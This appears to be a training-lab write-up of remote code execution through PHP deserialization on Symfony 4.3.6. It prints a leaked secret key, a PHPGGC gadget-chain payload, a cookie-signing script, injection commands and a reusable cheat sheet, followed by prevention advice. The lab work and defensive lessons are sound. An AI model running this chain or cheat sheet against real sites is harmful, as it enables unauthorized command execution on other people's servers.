# Lab 3: Exploiting PHP Deserialization with Pre-built Gadget Chain (Symfony)

## Lab Status: ✅ SOLVED

---

## Vulnerability Summary

**Type**: Insecure Deserialization with Gadget Chain Exploitation  
**Framework**: Symfony 4.3.6  
**Language**: PHP  
**Impact**: Remote Code Execution (RCE)  
**Exploited Component**: Session cookies (serialized PHP objects)

---

## Attack Chain

```
Modify serialized cookie
         ↓
Replace with malicious gadget chain
         ↓
Sign with correct HMAC-SHA1 secret
         ↓
Send to server
         ↓
Framework deserializes untrusted data
         ↓
Gadget chain executed during deserialization
         ↓
RCE: File deletion (morale.txt)
```

---

## Key Differences from Lab 1 & 2

| Aspect | Lab 1 (PHP) | Lab 2 (Java) | Lab 3 (Symfony) |
|--------|------------|-------------|-----------------|
| **Framework** | Custom PHP | Custom Java | Symfony 4.3.6 |
| **Serialization** | PHP native | Java serialized | PHP serialized |
| **Signing** | None | HMAC-SHA1 | HMAC-SHA1 |
| **Gadget Source** | Manual code audit | Apache Commons | Symfony framework |
| **Payload Generation** | PHP Reflection | ysoserial | PHPGGC |
| **Secret Discovery** | Source code | brute force | phpinfo.php leak |
| **Difficulty** | Medium | Hard | Hard |

---

## Step-by-Step Exploitation

### Step 1: Identify Framework & Debug Information

**Observation**: When modifying the session cookie with an invalid signature, the error message leaks:
- Framework: **Symfony 4.3.6**
- Debug file location: **/cgi-bin/phpinfo.php**

```
Internal Server Error: Symfony Version: 4.3.6
Developer comment: Debug information at /cgi-bin/phpinfo.php
```

### Step 2: Extract SECRET_KEY from phpinfo.php

**Command**:
```bash
curl -s https://[LAB_URL]/cgi-bin/phpinfo.php | grep -i "SECRET_KEY"
```

**Result**:
```html
<tr><td class="e">SECRET_KEY </td><td class="v">66b2imy0gbkmjs773rcmk4uy36b8a4za </td></tr>
```

**Extracted KEY**: `66b2imy0gbkmjs773rcmk4uy36b8a4za`

### Step 3: Generate Malicious Gadget Chain

**Tool**: PHPGGC (PHP Generic Gadget Chain Generator)

**Command**:
```bash
cd /tmp/phpggc
php -d xdebug.mode=off phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w0
```

**Payload Generated** (base64-encoded):
```
Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==
```

### Step 4: Create Valid Signed Cookie

**Script** (`sign_cookie.php`):
```php
<?php
$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
$secretKey = "66b2imy0gbkmjs773rcmk4uy36b8a4za";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
?>
```

**Execution**:
```bash
php sign_cookie.php
```

**Output** (URL-encoded cookie):
```
%7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubm
VySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg%3D%3D%22%2C%22sig_hmac_sha1%22%3A%2205d054dc1bfbca1adde256796aec6af302a2b935%22%7D
```

### Step 5: Inject Malicious Cookie

**Using curl**:
```bash
SIGNED_COOKIE=$(php sign_cookie.php)
curl -b "session=$SIGNED_COOKIE" https://[LAB_URL]/my-account
```

**Result**:
```
rm: cannot remove '/home/carlos/morale.txt': No such file or directory
Internal Server Error: Symfony Version: 4.3.6
PHP Fatal error: ... (gadget chain executed, error occurred after command)
```

**Lab Status**: ✅ SOLVED

---

## Critical Technical Details

### 1. Cookie Structure (JSON)
```json
{
  "token": "BASE64_SERIALIZED_OBJECT",
  "sig_hmac_sha1": "SHA1_HMAC_SIGNATURE"
}
```

### 2. HMAC Signing Process
```
HMAC-SHA1(
  key = SECRET_KEY,
  data = BASE64_SERIALIZED_OBJECT
) → 40-character hex digest
```

### 3. Symfony Gadget Chain Path
```
TagAwareAdapter → TagAwareAdapter (serialize/deserialize)
    ↓
ProxyAdapter → Stores malicious cache item
    ↓
CacheItem → Invokes saveDeferred()
    ↓
TagAwareAdapter→invalidateTags() → traverses gadget chain
    ↓
Chain executes: exec() → system command
```

### 4. Why /cgi-bin/phpinfo.php Leaks SECRET_KEY
- Developer left debug configuration enabled
- phpinfo() displays all environment variables
- Symfony stores SECRET_KEY in $_SERVER['SECRET_KEY']
- No access controls on the debug file

---

## Lessons Learned

### 1. Information Disclosure Chain
```
Error message → Framework version
         ↓
Framework version → Known debug endpoints
         ↓
Debug endpoints → Configuration leak (SECRET_KEY)
         ↓
SECRET_KEY → HMAC signing capability
         ↓
HMAC capability → Cookie manipulation
         ↓
Cookie manipulation → Gadget chain injection
         ↓
Gadget chain → RCE
```

### 2. Why HMAC Signature Alone Isn't Enough
- HMAC-SHA1 prevents tampering IF key is secure
- But framework versions with known gadget chains allow RCE once signature is verified
- Defense needed: **Disable serialization or use allow-lists**

### 3. PHPGGC vs ysoserial
- **ysoserial**: Java gadget chains (Apache Commons Collections, Spring, etc.)
- **PHPGGC**: PHP gadget chains (Laravel, Symfony, CakePHP, etc.)
- Both rely on unsafe deserialization of untrusted data
- Symfony/RCE4 uses TagAwareAdapter + ProxyAdapter chain

### 4. Secret Key Recovery Hierarchy
1. **Source code access** (hardcoded or config files)
2. **Debug endpoints** (phpinfo.php, /debug, etc.)
3. **Brute force / wordlists** (for weak secrets)
4. **Environment variable leaks** (.env files, error pages)
5. **Framework defaults** (if not changed)

---

## Prevention & Defense

### 1. Never Deserialize Untrusted Data
```php
// ❌ VULNERABLE
$user = unserialize($_COOKIE['session']);

// ✅ SAFE
$user = json_decode($_COOKIE['session'], true);
```

### 2. Use HMAC + Validation
```php
// Verify signature BEFORE deserializing
$sig = hash_hmac('sha1', $object, $secretKey);
if (!hash_equals($sig, $provided_sig)) {
    die('Invalid signature');
}
// Only then deserialize if truly necessary
```

### 3. Disable Debug Endpoints in Production
```bash
# Remove /cgi-bin/phpinfo.php
# Disable Symfony debug mode
# Set APP_ENV=prod (not dev)
```

### 4. Use Secure Session Management
```php
// PHP built-in sessions (use default handlers)
session_start();  // Uses secure cookie-based sessions
$_SESSION['user'] = $username;  // Don't serialize objects
```

### 5. Update Dependencies Regularly
```bash
composer update  # For Symfony & dependencies
```

---

## Timeline

| Step | Time | Action | Result |
|------|------|--------|--------|
| 1 | Discovery | Modified cookie, error message leaked framework info | Identified Symfony 4.3.6 + debug endpoint |
| 2 | Recon | Fetched /cgi-bin/phpinfo.php | Extracted SECRET_KEY |
| 3 | Payload Gen | PHPGGC Symfony/RCE4 | Generated gadget chain (base64) |
| 4 | Signing | PHP HMAC-SHA1 script | Created valid signed cookie |
| 5 | Injection | cURL with malicious cookie | Executed rm command → Lab solved |

---

## Commands Cheat Sheet

```bash
# 1. Install PHPGGC
cd /tmp && git clone https://github.com/ambionics/phpggc.git

# 2. List frameworks
php /tmp/phpggc/phpggc -l | grep -i symfony

# 3. Generate payload
php /tmp/phpggc/phpggc Symfony/RCE4 exec 'COMMAND' | base64 -w0

# 4. Sign cookie (use PHP script provided)
php sign_cookie.php

# 5. Test injection
curl -b "session=SIGNED_COOKIE" https://target/my-account
```

---

## Real-World Implications

1. **Symfony-based e-commerce sites** are common targets
2. **Debug mode enabled in production** is surprisingly common
3. **phpinfo.php accessibility** is a known vulnerability
4. **Gadget chain exploitation** doesn't require source code
5. **One weak link** (unprotected debug file) = RCE

---

**Status**: Lab Solved ✅  
**Difficulty**: Hard ⚠️  
**Real-World Relevance**: Very High 🔴
